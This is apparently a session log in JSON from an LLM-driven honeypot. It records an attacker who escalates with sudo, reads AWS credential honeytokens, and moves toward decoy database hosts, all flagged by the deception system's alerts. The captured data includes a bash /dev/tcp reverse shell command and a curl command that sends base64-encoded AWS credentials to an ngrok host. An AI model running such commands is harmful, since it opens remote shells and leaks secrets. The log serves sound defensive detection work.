@@ -1,0 +1,105 @@
+{
+  "id": "6d685aa2-53bc-483f-926a-6a73915058fb",
+  "engagement_id": "8d1bd057-9014-4719-be4d-c9f56b9199ad",
+  "connection_count": 2,
+  "claimed_user": "jdoe",
+  "source_ip": "127.0.0.1",
+  "first_seen_at": 1778544080.8817575,
+  "started_at": 1778545206.8269188,
+  "ended_at": 1778545466.7851505,
+  "duration_s": 259.96,
+  "engagement_duration_s": 1385.9,
+  "restored_from_state": true,
+  "command_count": 5,
+  "observed": {
+    "ran_sudo": true,
+    "services_probed": [
+      "mysql"
+    ],
+    "attempted_lateral": true,
+    "found_crown_jewel": true,
+    "isolated": true,
+    "planted_sudo_cve": true,
+    "spawned_mysql": true,
+    "credential_files_read": [
+      "/home/jdoe/.aws/config",
+      "/home/jdoe/.aws/credentials"
+    ],
+    "honeytoken_modifications": [
+      "/home/jdoe/.aws/credentials"
+    ],
+    "honeytoken_deletions": [],
+    "payload_drops": [
+      "/tmp/stolen.txt"
+    ],
+    "ssh_persistence_attempt": false,
+    "bash_history_inspected": false,
+    "credential_search_attempted": false,
+    "credential_search_terms": [],
+    "reverse_shell_attempted": true,
+    "reverse_shell_command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    "dns_exfil_attempted": true,
+    "dns_exfil_commands": [
+      "curl https://x.ngrok.io/$(cat ~/.aws/credentials | base64)"
+    ],
+    "lateral_to_decoy": true,
+    "decoy_targets": [
+      "db-prod",
+      "db-prod-01"
+    ],
+    "log_tampering": false,
+    "tampering_commands": [],
+    "attempted_sudo_elevation": true,
+    "decoys_planted": [
+      "/etc/mysql/my.cnf",
+      "/etc/sudoers.d/zzz_compat"
+    ],
+    "decoys_swallowed": [
+      "/etc/mysql/my.cnf",
+      "/etc/sudoers.d/zzz_compat"
+    ],
+    "alerted_ssh_persistence": false,
+    "alerted_honeytoken_tamper": true,
+    "alerted_credential_exfil": true,
+    "alerted_payload_staging": false,
+    "alerted_credential_search": false,
+    "alerted_reverse_shell": true,
+    "alerted_dns_exfil": true,
+    "alerted_lateral_decoy": true,
+    "alerted_log_tampering": false,
+    "alerted_decoy_swallowed": true
+  },
+  "actions_taken": [],
+  "commands": [
+    {
+      "ts": 1778545224.701724,
+      "cmd": "sudo -i",
+      "response_source": "llm",
+      "response_preview": "# whoami\nroot\n# pwd\n/"
+    },
+    {
+      "ts": 1778545258.9771175,
+      "cmd": "cat /etc/sudoers.d/zzz_compat",
+      "response_source": "vfs-read",
+      "response_preview": "# Compat overrides for legacy services. Do not edit by hand.\n# Generated 2026-03-14 by ansible role ops.legacy-compat v1.7.3.\n\nDefaults  !syslog\nDefaults  targetpw\n%wheel    ALL=(ALL) NOPASSWD: ALL\nde"
+    },
+    {
+      "ts": 1778545286.099569,
+      "cmd": "sudo -i",
+      "response_source": "llm",
+      "response_preview": "root@corp-app01:~#"
+    },
+    {
+      "ts": 1778545320.3300526,
+      "cmd": "whoami",
+      "response_source": "cache+elevated",
+      "response_preview": "root\n"
+    },
+    {
+      "ts": 1778545325.424326,
+      "cmd": "id",
+      "response_source": "cache+elevated",
+      "response_preview": "uid=0(root) gid=0(root) groups=0(root)\n"
+    }
+  ]
+}
